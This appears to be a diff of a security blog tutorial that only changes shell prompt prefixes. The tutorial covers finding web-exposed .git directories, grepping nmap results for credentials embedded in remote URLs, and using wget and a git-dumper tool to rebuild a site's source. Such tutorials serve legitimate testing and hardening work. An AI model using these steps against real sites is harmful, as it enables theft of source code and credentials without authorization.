@@ -16,7 +16,7 @@ How to scan for web exposed git directories:
 Some developers may clone repository specifying their login and password as part of the url, setting this remote origin in the git configuration. For example, once your nmap done, you can spot some login:password playing with this command:  
 
 ```
-# grep -A1 Remotes http-git.nmap | grep -E ":.*:[^:]*@.*" | awk '{print $2}'
+$ grep -A1 Remotes http-git.nmap | grep -E ":.*:[^:]*@.*" | awk '{print $2}'
 https://apixxxxxx:[redacted]@github.com/apixxxxxx/apixxxxxx.git
 http://deploy:[redacted]@10.0.0.4:7990/scm/[redacted]/portal.git
 ...
@@ -34,7 +34,7 @@ Knowing a bit of a [.git repository layout](https://git-scm.com/docs/gitreposito
   
 If a repository seems interesting and has directory traversal and/or leaks in its remote url some credentials, you can simply download or clone the repository. For example to download the whole repo you can do the following:  
 ```
-wget --recursive --no-parent http://localhost/phackt.github.io/.git/ && \
+$ wget --recursive --no-parent http://localhost/phackt.github.io/.git/ && \
 cd localhost/phackt.github.io && \
 git reset --hard
 ```  
@@ -42,7 +42,7 @@ git reset --hard
 Now what happens if you didn't find any creds (most of the cases) and **directory traversal is not enabled** ? I will not reinvent the wheel and advice you to read this [article](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/) amongst others.  
 
 ```
-# curl -I http://localhost/phackt.github.io/.git/
+$ curl -I http://localhost/phackt.github.io/.git/
 HTTP/1.1 403 Forbidden
 Date: Sat, 11 Aug 2018 17:00:04 GMT
 Server: Apache/2.4.33 (Debian)
@@ -52,9 +52,9 @@ Content-Type: text/html; charset=iso-8859-1
 I gave a try to another git dumper tool:  
   
 ```
-git clone https://github.com/phackt/git-dumper && cd git-dumper
-pip install -r requirements.txt
-./git-dumper.py http://localhost/phackt.github.io/.git/ /tmp/repo
+$ git clone https://github.com/phackt/git-dumper && cd git-dumper
+$ pip install -r requirements.txt
+$ ./git-dumper.py http://localhost/phackt.github.io/.git/ /tmp/repo
 [-] Testing http://localhost/phackt.github.io/.git/HEAD [200]
 [-] Testing http://localhost/phackt.github.io/.git/ [403]
 [-] Fetching common files
@@ -73,7 +73,7 @@ pip install -r requirements.txt
 We can now inspect our freshly rebuilt repository:  
 
 ```
-cd /tmp/repo && ls -1
+$ cd /tmp/repo && ls -1
 about.md
 categories.md
 CNAME
